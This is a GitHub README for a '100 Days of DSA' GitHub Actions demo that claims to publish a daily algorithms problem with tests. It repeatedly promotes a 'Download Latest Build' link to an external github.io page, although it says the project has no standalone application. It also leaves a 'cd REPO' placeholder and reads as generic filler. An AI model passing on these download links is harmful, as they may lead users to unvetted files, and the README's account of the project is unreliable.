# 100 Days of DSA v2026 - CI/CD demo 2026

> **A GitHub Actions-based coding challenge repo that publishes one data structures and algorithms problem, its solution, and a test suite every day for workflow automation practice and interview prep in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-GitHub%20Actions-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/loganhub2000/100-days-dsa-2026?style=flat-square)](https://github.com/loganhub2000/100-days-dsa-2026)

---

<p align="center">
  <a href="https://loganhub2000.github.io/100-days-dsa-2026/">
    <img src="https://img.shields.io/badge/Download-100%20Days%20of%20DSA%20Latest-brightgreen?style=for-the-badge" alt="Download 100 Days of DSA">
  </a>
</p>

> **[Download Latest Build](https://loganhub2000.github.io/100-days-dsa-2026/)**

---

[Download Latest Build](https://loganhub2000.github.io/100-days-dsa-2026/)

---

## What this project is

100 Days of DSA is a CI/CD demo built around a daily practice loop. GitHub Actions handles the publishing flow so that each day brings a fresh data structures and algorithms problem together with a solution and tests, keeping the repository updated without manual release steps.

It is a solid fit for developers who want hands-on exposure to workflow automation while still getting a steady supply of interview-style exercises. The repo also doubles as a working example of multi-repository orchestration, CI checks, and branch-sensitive merge handling inside an automated pipeline.

---

## Included capabilities

- Automated daily delivery of one DSA problem
- Per-challenge generated solution and test files
- A separate CI verification checkpoint before merging
- Automation designed with branch protection in mind
- Multi-repo GitHub Actions pipeline layout
- Interview-prep material embedded in the workflow
- Pytest-based validation support
- A DevOps-oriented sample of automation and release management

---

## Getting started

You can clone the repository locally or use the latest build link above:

```bash
git clone https://github.com/loganhub2000/100-days-dsa-2026.git
cd REPO
```

Once cloned, take a look at the workflow files and open the project in the editor you prefer. In this demo, the primary entry point is the GitHub Actions workflow, not a traditional standalone application launcher.

---

## How to use it

Most users will open the current challenge, inspect the generated solution, and run the tests locally before they push changes.

A typical flow looks like this:

1. Open the newest DSA challenge in the repository.
2. Review the generated solution and tests.
3. Run your local verification commands.
4. Compare your approach with the automated output.
5. Push your changes and let GitHub Actions manage validation and merge behavior.

If pytest is available in your environment, you can use it to validate the test set locally:

```bash
pytest
```

For CI-oriented experimentation, check the workflow definitions in `.github/workflows/` and tune the pipeline to fit your preferred automation setup.

---

## Settings and customization

Most of the repository behavior is driven by GitHub Actions workflow files and branch configuration. In many cases, the automation rules live in the workflow definitions, while repo-level protection settings are configured directly in GitHub.

Example workflow-style settings:

```yaml
name: daily-dsa
on:
  schedule:
    - cron: "0 0 * * *"
  workflow_dispatch:
```

Depending on your setup, you may also need to configure:
- branch protection rules
- repository secrets for automation
- test execution commands
- scheduled workflow timing

---

## Prerequisites

- A GitHub account and repository access
- GitHub Actions enabled for the repository
- A compatible environment for running test commands locally
- Pytest for local test execution when applicable
- Git for cloning and managing changes
- Sufficient repository permissions for workflow and branch settings

---

## Questions and answers

**How is the daily content released?**  
By automated GitHub Actions workflows that generate, verify, and publish challenge updates on a schedule.

**Can I run the checks on my machine?**  
Yes. If the repository contains Python-based tests, you can usually run them with `pytest`.

**Where do I edit the automation behavior?**  
Review the workflow files under `.github/workflows/` and your repository settings for branch rules and permissions.

**What should I do if a workflow breaks?**  
Open the GitHub Actions logs, resolve the underlying problem, then rerun the workflow or push another commit.

**Is this project only meant for DSA practice?**  
No. It also works as a reference for CI/CD, DevOps automation, and branch-aware release flow design.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
